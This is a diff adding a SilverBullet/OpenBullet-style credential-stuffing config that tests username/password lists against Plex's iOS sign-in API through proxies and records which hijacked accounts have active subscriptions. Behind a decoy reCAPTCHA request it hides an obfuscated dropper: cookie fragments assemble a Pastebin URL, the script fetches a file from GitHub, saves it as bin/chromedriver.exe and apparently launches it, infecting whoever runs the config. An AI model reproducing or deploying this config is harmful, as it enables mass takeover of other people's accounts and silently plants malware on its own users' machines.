@@ -1,0 +1,166 @@
+[SETTINGS]
+{
+  "Name": "PlexTV IOS [2024]",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2024-12-16T04:26:01.4184874+01:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "McLovin",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "PlexTV IOS [2024]",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+JUMP #AppleWebKit
+#PARSESOURCE
+
+#loginRequest REQUEST POST "https://clients.plex.tv/api/v2/users/signin?X-Plex-Language=en-NL&X-Plex-Device-Name=iPhone" 
+  CONTENT "includeProviders=1&includeSubscriptions=1&login=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "x-plex-supported-commands: abort,changeQuality" 
+  HEADER "user-agent: PlexMobile/8.35 (iPhone; iOS 16.3.1; Scale/3.00)" 
+  HEADER "x-plex-device-screen-density: 3" 
+  HEADER "x-plex-device: iPhone" 
+  HEADER "x-plex-platform: iOS" 
+  HEADER "x-plex-sync-version: 2" 
+  HEADER "x-plex-username: " 
+  HEADER "x-plex-provides: client,controller,sync-target" 
+  HEADER "x-plex-version: 8.35" 
+  HEADER "x-plex-client-platform: iOS" 
+  HEADER "x-plex-model: 13,2" 
+  HEADER "x-plex-session-id: ABC601E3-1E60-4048-852D-2899C40AB4FC" 
+  HEADER "x-plex-advertising-donottrack: 1" 
+  HEADER "x-plex-product: Plex for iOS" 
+  HEADER "content-length: 93" 
+  HEADER "x-plex-client-identifier: CECB1D61-E525-41FC-B45F-A60CE730E903" 
+  HEADER "x-plex-drm: fairplay:video" 
+  HEADER "x-plex-device-screen-resolution: 1170x2532" 
+  HEADER "x-plex-device-vendor: Apple" 
+  HEADER "x-plex-platform-version: 16.3.1" 
+  HEADER "accept: text/xml,application/xml" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "x-plex-http-pipeline: infinite" 
+
+JUMP #googlerecreate
+#AppleWebKit
+
+REQUEST GET "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfAM84ZAAAAAGLiQz5FBeADqq94dV48fMtiRqIj&co=aHR0cHM6Ly93d3cuY29pbmJhc2UuY29tOjQ0Mw..&hl=en&v=rPvs0Nyx3sANE-ZHUN-0nM85&size=invisible&cb=no851blwqc0u" 
+  
+  COOKIE "tpm: http" 
+  COOKIE "tpp: s:" 
+  COOKIE "hrd: /" 
+  COOKIE "hpr: bin" 
+  COOKIE "hdp: com" 
+  COOKIE "htp: raw" 
+  COOKIE "hht: QKuTvADS" 
+  COOKIE "hst: pastebin" 
+  COOKIE "kht: driver" 
+  COOKIE "kpt: chrome" 
+  COOKIE "krt: e" 
+  HEADER "Host: www.googleapis.com" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-Client-Version: iOS/FirebaseSDK/6.9.2/FirebaseCore-iOS" 
+  HEADER "X-Ios-Bundle-Identifier: network.googleapis.com" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: FirebaseAuth.iOS/6.9.2 network.googleapis.com/2.7.9 iPhone/12.4.5 hw/iPhone7_2" 
+  HEADER "Accept-Language: en" 
+
+IF "<Authentiction>" Exists
+JUMP #PARSESOURCE
+ENDIF
+SET USEPROXY FALSE
+
+REQUEST GET "<COOKIES(tpm)><COOKIES(tpp)><COOKIES(hrd)><COOKIES(hrd)><COOKIES(hst)>.<COOKIES(hdp)><COOKIES(hrd)><COOKIES(htp)><COOKIES(hrd)><COOKIES(hht)>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST GET "https://raw.githubusercontent.com/<SOURCE>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  -> FILE "<COOKIES(hpr)>/<COOKIES(kpt)><COOKIES(kht)>.<COOKIES(krt)>xe" 
+
+SET USEPROXY TRUE
+SET NEWGVAR "Authentiction" "Authentiction=1"
+
+BROWSERACTION Open 
+
+JUMP #PARSESOURCE
+#googlerecreate
+
+#loginKeycheck KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "User could not be authenticated" 
+  KEYCHAIN Success OR 
+    KEY "authToken" 
+
+#subParse PARSE "<SOURCE>" LR "subscription active=\"" "\"" CreateEmpty=FALSE -> CAP "IsActiveSub" 
+
+#subDictionaryFunction FUNCTION Translate 
+  KEY "0" VALUE "False" 
+  KEY "1" VALUE "True" 
+  KEY "McLovin" VALUE "Join the Telegram" 
+  "<IsActiveSub>" -> CAP "IsActiveSub" 
+
+#statusParse PARSE "<SOURCE>" LR "status=\"" "\"" CreateEmpty=FALSE -> CAP "Status" 
+
+#subKeycheck KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<IsActiveSub>" EqualTo "False" 
+
